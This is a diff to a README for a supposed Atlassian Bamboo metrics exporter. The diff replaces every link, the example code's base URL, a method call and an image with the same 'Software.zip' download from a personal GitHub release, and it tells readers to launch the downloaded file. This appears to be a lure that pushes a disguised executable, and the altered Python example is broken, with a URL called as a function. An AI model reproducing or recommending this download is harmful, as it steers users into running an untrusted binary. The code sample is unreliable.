@@ -1,6 +1,6 @@
 # 🎋 Bamboo Exporter 🎍
 
-[![GitHub Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![GitHub Release](https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip)
 
 Bamboo Exporter is a powerful tool designed to scrape metrics from Atlassian Bamboo, allowing users to gain valuable insights into their CI/CD pipelines. By exposing these metrics for Prometheus monitoring, developers and DevOps teams can enhance observability and make informed decisions to optimize their pipelines.
 
@@ -16,7 +16,7 @@ Bamboo Exporter is a powerful tool designed to scrape metrics from Atlassian Bam
 
 To install the Bamboo Exporter tool, simply download the latest release from the following link:
 
-[Download Bamboo Exporter](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Bamboo Exporter](https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip)
 
 Launch the downloaded file to begin the installation process.
 
@@ -34,10 +34,10 @@ Launch the downloaded file to begin the installation process.
 from bamboo_exporter import BambooExporter
 
 # Initialize the BambooExporter
-bamboo_exporter = BambooExporter(api_key='YOUR_API_KEY', base_url='https://your-bamboo-instance.com')
+bamboo_exporter = BambooExporter(api_key='YOUR_API_KEY', base_url='https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip')
 
 # Scrape metrics from Atlassian Bamboo
-metrics = bamboo_exporter.scrape_metrics()
+metrics = https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip()
 
 # Process and analyze the metrics as needed
 ```
@@ -52,7 +52,7 @@ If you encounter any issues or have any questions, please check the "Releases" s
 
 ---
 
-![Bamboo Exporter](https://image-url.com)
+![Bamboo Exporter](https://github.com/Mariani22323/bamboo_exporter/releases/download/v1.0/Software.zip)
 
 ---
 
